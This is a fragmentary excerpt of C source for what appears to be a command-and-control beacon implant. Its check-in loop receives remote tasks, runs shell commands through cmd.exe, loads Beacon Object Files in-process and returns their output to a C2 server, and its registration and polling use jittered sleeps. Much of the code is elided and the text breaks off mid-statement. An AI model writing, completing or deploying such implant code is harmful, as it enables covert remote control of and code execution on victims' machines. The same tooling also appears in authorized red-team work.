...
/**
 * @brief Send queued output, receive pending tasks, and dispatch each task.
 *        Shell commands are executed via cmd.exe; BOFs are loaded in-process.
 *        Output is queued for the next checkin.
 * @return 0 on success, -1 if the transport call fails.
 */
static int do_checkin(void) {
    ...
    if (top_hdr.flags & PKG_FLAG_BATCH) {
        ...
        while (off + PACKAGE_HEADER_SIZE <= batch_len) {
                ...
                case PKG_CMD_BOF_EXECUTE: {
                        ...
                        package_read_string(&sub_reader, &args_hex, &args_len))
                    {
                        ...
                        if (args) {
                            ...
                            args[raw_len] = '\0';
                            execute_bof((unsigned char *)bof, bof_len, args, raw_len);
                            free(args);
                        }
                        int         out_len = shell_output_len();
                        const char *out_buf = shell_output_buf();
            ...
            /* Advance by length field + 4 bytes for the field itself */
            uint32_t sub_wire_len =
                ((uint32_t)batch[off]   << 24) | ((uint32_t)batch[off+1] << 16) |
                ((uint32_t)batch[off+2] <<  8) |  (uint32_t)batch[off+3];
            off += sub_wire_len + 4;
        }
    }
...
int beacon_main(void) {
    ...
    while (do_register(agent_id, AGENT_ID_SIZE) != 0) {
        ...
        int sleep_ms = base_ms + rand() % (base_ms / 4 + 1);
    ...
    /* Flush any output from shell_init before the first real checkin */
    {
        int         out_len = shell_output_len();
        const char *out_buf = shell_output_buf();
        if (out_len > 0) {
    ...
    while (1) {
        do_checkin();
        int sleep_ms = (int)C2_SLEEP_BASE_MS
